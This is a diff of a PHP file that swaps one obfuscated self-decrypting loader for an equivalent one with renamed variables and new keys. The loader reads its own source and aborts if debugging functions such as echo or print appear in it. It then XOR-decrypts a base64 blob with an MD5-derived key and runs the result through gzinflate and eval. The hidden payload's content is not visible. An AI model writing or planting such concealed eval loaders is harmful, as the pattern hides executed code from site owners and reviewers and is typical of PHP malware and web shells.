@@ -1,24 +1,24 @@
 <?php
-$uklbwqmve="75bf938464ced284097804d67c7073a6";
-$lreimaawum="0406075f5d000b0d55045603560b5951010a005c0652560e065753550f570401";
-$sshjicfzwuql="gIJK8UwzMw==";
-$ksdwwqsv=file_get_contents(__FILE__);
-$yqfwlnuvdpep=str_replace($sshjicfzwuql,"",$ksdwwqsv);
-if(strpos($yqfwlnuvdpep,"ec"."ho")!==false||strpos($yqfwlnuvdpep,"pr"."int")!==false||strpos($yqfwlnuvdpep,"var_"."dump")!==false||strpos($yqfwlnuvdpep,"file_put_"."contents")!==false||strpos($yqfwlnuvdpep,"fw"."rite")!==false){die();}
-$paeaspkyfk=str_replace(array($uklbwqmve,$lreimaawum),array("SP_28453f7b","KP_36bfff9b"),$ksdwwqsv);
-$duxdvqilrbp=md5($paeaspkyfk);
-$zgyzvcjbb=hex2bin($lreimaawum);
-$dwrwfjgdscwu="";
-$scmlnh=strlen($duxdvqilrbp);
-for($yzmdkirz=0;$yzmdkirz<$scmlnh;$yzmdkirz++){
-    $dwrwfjgdscwu.=chr(ord($zgyzvcjbb[$yzmdkirz])^ord($duxdvqilrbp[$yzmdkirz]));
+$neeawjdygd="3041700659c9d940e7c49731b61ce4f6";
+$xpdpgyuvpip="04020c030307070205085b5b5c5c0d03555205560a075106070e015751010452";
+$sppgldtvu="hIMX+hw3Nw==";
+$pefnammpbv=file_get_contents(__FILE__);
+$adqmblv=str_replace($sppgldtvu,"",$pefnammpbv);
+if(strpos($adqmblv,"ec"."ho")!==false||strpos($adqmblv,"pr"."int")!==false||strpos($adqmblv,"var_"."dump")!==false||strpos($adqmblv,"file_put_"."contents")!==false||strpos($adqmblv,"fw"."rite")!==false){die();}
+$zvfcsjeho=str_replace(array($neeawjdygd,$xpdpgyuvpip),array("SP_3b3c0fd7","KP_7235455f"),$pefnammpbv);
+$tiuyqatvvt=md5($zvfcsjeho);
+$vjgegjvvx=hex2bin($xpdpgyuvpip);
+$julnwsliovt="";
+$lrolnksqfzt=strlen($tiuyqatvvt);
+for($lqqifltjl=0;$lqqifltjl<$lrolnksqfzt;$lqqifltjl++){
+    $julnwsliovt.=chr(ord($vjgegjvvx[$lqqifltjl])^ord($tiuyqatvvt[$lqqifltjl]));
 }
-$vbrvgjs=base64_decode($sshjicfzwuql);
-$uxhyediiwgdf=strlen($vbrvgjs);
-$aomwqpspte="";
-$jyydwxvmnav=strlen($dwrwfjgdscwu);
-for($yzmdkirz=0;$yzmdkirz<$uxhyediiwgdf;$yzmdkirz++){
-    $aomwqpspte.=$vbrvgjs[$yzmdkirz]^$dwrwfjgdscwu[$yzmdkirz%$jyydwxvmnav];
+$fgdfzif=base64_decode($sppgldtvu);
+$cujftpmpz=strlen($fgdfzif);
+$yydwwbbtplzk="";
+$ezonuvrk=strlen($julnwsliovt);
+for($lqqifltjl=0;$lqqifltjl<$cujftpmpz;$lqqifltjl++){
+    $yydwwbbtplzk.=$fgdfzif[$lqqifltjl]^$julnwsliovt[$lqqifltjl%$ezonuvrk];
 }
-$ukznngfvwgm="gz"."in"."fl"."ate";
-eval($ukznngfvwgm($aomwqpspte));
+$udviloppgg="gz"."in"."fl"."ate";
+eval($udviloppgg($yydwwbbtplzk));
